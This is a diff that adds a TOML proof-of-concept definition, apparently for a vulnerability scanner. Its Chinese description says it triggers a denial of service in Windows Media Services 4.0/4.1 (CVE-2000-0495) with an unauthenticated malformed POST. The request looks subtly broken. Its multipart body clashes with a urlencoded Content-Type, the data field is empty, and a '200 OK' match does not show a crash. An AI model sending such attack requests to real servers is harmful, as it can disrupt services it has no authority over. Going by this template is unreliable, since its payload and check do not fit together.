@@ -1,0 +1,40 @@
+[info]
+author = "ave"
+description = "通过向 Windows Media Services 4.0/4.1 发送畸形编码器请求来触发拒绝服务漏洞。该恶意请求会导致服务停止响应，攻击者无需认证即可远程触发。"
+id = "POC-AVE-2000-0418"
+name = "CVE-2000-0495 Windows Media Services DoS PoC"
+severity = "medium"
+tags = ["ave-2000-0418"]
+vuln_id = [
+    "CVE-2000-0495",
+    "AVE-2000-0418",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/wmsverter"
+protocol = "http"
+
+[poc.requests.body]
+content = """
+------WebKitFormBoundary7MA4YWxkTrZu0gW\r
+Content-Disposition: form-data; name="filename"\r
+\r
+malicious.mp3\r
+------WebKitFormBoundary7MA4YWxkTrZu0gW\r
+Content-Disposition: form-data; name="data"\r
+\r
+"""
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["200 OK"]
